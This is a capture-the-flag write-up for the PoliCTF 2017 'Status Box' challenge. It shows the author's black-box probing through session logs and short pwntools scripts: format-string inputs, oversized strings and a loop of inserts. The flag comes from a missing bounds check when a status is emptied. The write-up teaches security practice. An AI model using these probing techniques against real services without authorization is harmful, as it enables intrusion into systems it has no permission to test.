---
layout: post
title: PoliCTF 2017 - Status Box
permalink: /writeups/polictf2017/statusbox
description: "Writeup for Status Box challenge from PoliCTF 2017"
date: 2017-07-09
tags: [blackbox, pwn, polictf, writeup]
comments: true
share: true
---

> ### Case Notes 
>
> This Box memorizes a statuses sequence composed by a current status and all the previous ones. It already contains a small sequence of statuses, but you can show only the current one. You can set a new status, modify the current one or delete it: in this way the box goes back to the previous one in the sequence. The box can keep track of maximum 200 statuses. It seems just to work fine, even though we didn't test it a lot\.\.\.;
>
> `nc statusbox.chall.polictf.it 31337`

Status Box was an interesting pwn challenge as no source or binaries were given, so some blackbox testing was required to find the vulnerability.

This writeup consists of my thought process to solve this challenge, therefore it will be longer than other writeups (you can skip to see the solution in the end).

## Understanding the service
The service consists of mainly 4 functionalities.
```
vagrant@vagrant-ubuntu-trusty-64:/vagrant/polictf/statusbox$ nc statusbox.chall.polictf.it 31337

StatusBox started! This Box memorizes a statuses
sequence composed by a current status and all the previous ones.
It already contains a small sequence of statuses, but you can show
only the current one.
You can set a new status, modify the current one or delete it: in this way
the box goes back to the previous one in the sequence.
The box can keep track of maximum 200 statuses.
It seems just to work fine, even though we didn't test it a lot...
CURRENT STATUS:
This is the status set as default current status, change it!


Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

#### 0 - Print the current status
This just prints out the current status.

```
0

Your choice was: 0
CURRENT STATUS:
This is the status set as default current status, change it!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

#### 1 - Set a new current status
Prompts for a string which will be added into the list of statuses, and the current status is set to this.

```
1

Your choice was: 1
Insert the new status:
my new status
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
my new status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

#### 2 - Delete the current status and go back to the previous one
Pretty self explanatory.

```
2

Your choice was: 2
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
my status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

#### 3 - Modify the current status.
Prompts for another string which will replace the current status.

If we give an empty string, we get the following

```
3

Your choice was: 3
Insert the new status, it will modify the current one:
new modified status
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
new modified status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

#### 4 - Exit (statuses will be lost.)
Exits the service.

## Finding the vulnerability
The first thing to do is to find the vulnerability in the service. I tried various kinds of inputs hoping the service will crash.

### Format string bug
Dealing with string input, there's always a possibilty to have a format string bug. I tried out some format specifiers `%x` and `%s` and see if I get some memory leaks, but they just showed up as normal.

```
1

Your choice was: 1
Insert the new status:
%s%x%x%d
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
%s%x%x%d

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

```
3

Your choice was: 3
Insert the new status, it will modify the current one:
%x%x%x%x%x%x%x%x%s%s
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
%x%x%x%x%x%x%x%x%s%s

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
```

No info leaks :(

### Buffer overflow
#### Overflow the status array
First thing I tried was to create more than the allowed 200 statuses with a script. However it didn't really work out well\.\.\.

```
from pwn import *

r = remote("statusbox.chall.polictf.it", 31337)

print r.recvline()
print r.recvuntil(')')

# loop 300 times
for i in range(300):
    print i		# log the number of statuses inserted
    r.sendline('1')	# send 1 to insert status
    r.recvline()
    r.recvline()
    r.recvline()
    r.sendline('A')	# send 'A' as status
    r.recvuntil(')')
    r.sendline('0')	# send 0 to read current status
    r.recvuntil(')')	

r.interactive()		# print all remaining output by the service and take over the input from here
```

```
[+] Opening connection to statusbox.chall.polictf.it on port 31337: Done


StatusBox started! This Box memorizes a statuses
sequence composed by a current status and all the previous ones.
It already contains a small sequence of statuses, but you can show
only the current one.
You can set a new status, modify the current one or delete it: in this way
the box goes back to the previous one in the sequence.
The box can keep track of maximum 200 statuses.
It seems just to work fine, even though we didn't test it a lot...
CURRENT STATUS:
This is the status set as default current status, change it!


Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
Traceback (most recent call last):
  File "statusbox.py", line 15, in <module>
    r.recvuntil(')')
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 305, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 78, in recv
    return self._recv(numb, timeout) or ''
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 156, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 126, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/sock.py", line 54, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to statusbox.chall.polictf.it port 31337
```

Either the connection was so bad that it just timed out after inserting a few statuses, or we weren't actually given the luxury to insert 200 statuses.
Anyways I just assumed that the connection was bad and proceeded to the next step.

(That was a bad decision made by me back then, as the program could have possibly crashed and I would have missed the vulnerability.)

#### Overflow the status string
Again, I used a simple script to try to overflow the status string while inserting. (Now that I think about it, I forgot to do the same for modifying status)

```
from pwn import *

r = remote("statusbox.chall.polictf.it", 31337)

r.sendline('1')	# send 1 to insert status
r.sendline('A' * 20000)	# send 20000 'A's
r.sendline('0')	# send 0 to read current status
r.interactive()	# gets all output by the service
```

After sending in 20000 'A's, then sending 0 to retrieve our current status and copy the result to `len()` in python, we get that our status is indeed 20000 bytes long. So, no overflow for us.

Actually, at the start of the contest when I worked on this challenge, the program only reads in a limited number of 1024 bytes. But the result is still the same, there is no overflow here.

#### Deleting all statuses
Another possible way to access memory out of our control is to possibly delete more statuses than we currently have, and hopefully the index to the array becomes negative, so that we can access the memory before the array.

```
Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
2

Your choice was: 2
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the third status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
2

Your choice was: 2
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the second status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
2

Your choice was: 2
Done!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the first status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
2

Your choice was: 2
You cannot delete more statuses.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
2

Your choice was: 2
You cannot delete more statuses.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the first status
```

As we can see there is also a check for it, so this didn't work as well.

### Integer overflow
At this point, I was pretty desperate and just tried out some negative and really large numbers hoping that the service will crash, but the program just told me the input was invalid.

```
Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
-1

Your choice was: -1
Wrong choice, input 1,2 or 3.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
99999999999999999999999999999999999999999999999999999999999999999

Your choice was: 99999999999999999999999999999999999999999999999999999999999999999
Wrong choice, input 1,2 or 3.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Your choice was: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wrong choice, input 1,2 or 3.
```

## Solution
There seems to be checks at every part of the service, it is just unbreakable.

For a while, I had no idea of what to do at all, and just continued providing various inputs to the service hoping it crashes.

### The missing piece
Then I found out, if I chose (3) and provide an empty string, the program deletes the current status. 

```
Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the third status
```

This could possibly allow me to access the memory before the array.

```
Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the second status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
This is the first status

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
Whoops, what's that?
```

And here we have something interesting. I continued traversing the array backwards.

```
Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
That's strange...

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
Are you sure of what you're doing?

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
Ok ok, stop now!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
Well, you got me...the next one is the flag.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
TROLLED!

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
Nothing more to see here.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
None

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
None

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
None

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
3

Your choice was: 3
Insert the new status, it will modify the current one:

You set the current state to empty, so it was deleted.
Going back to the previous state.

Choose your action:
0 - Print the current status;
1 - Set a new current status;
2 - Delete the current status and go back to the previous one;
3 - Modify the current status.
4 - Exit (statuses will be lost.)
0

Your choice was: 0
CURRENT STATUS:
flag{g00d_0ld_m1ss1ng_ch3cks!}
```

We have `flag{g00d_0ld_m1ss1ng_ch3cks!}`

## Notes
### Misconfiguration or hint?
Actually, in the middle of the CTF, due to some misconfiguration I think, some error messages were given by the service when trying to insert a new status or when providing nothing as input. The error message was in python.

I'm not sure if it was intended to be a hint but I don't think it gave away the bug in any way.

### Don't miss anything
As mentioned above I actually missed out some possible ways to find an overflow bug in the program, as I just made stupid assumptions or simply forgot to try.

Although eventually I could have still ended up trying them, I would have wasted a lot of time because of this if they were actually where the bug resides.

### A valuable lesson
I find this challenge rather special as it does not have the typical overflow or format string vulnerabilities. This causes people like me who lack experience to stumble a little bit.

But this ultimately reminds me after working on buffer overflows, format string bugs and heap exploitation, vulnerabilities are in the end just mistakes by the programmer in various ways, and we are to exploit them to do things that were not originally intended by the programmer.

### Acknowledgements
Finally, I would like to thank the Tower of Hanoi team for organising this wonderful CTF.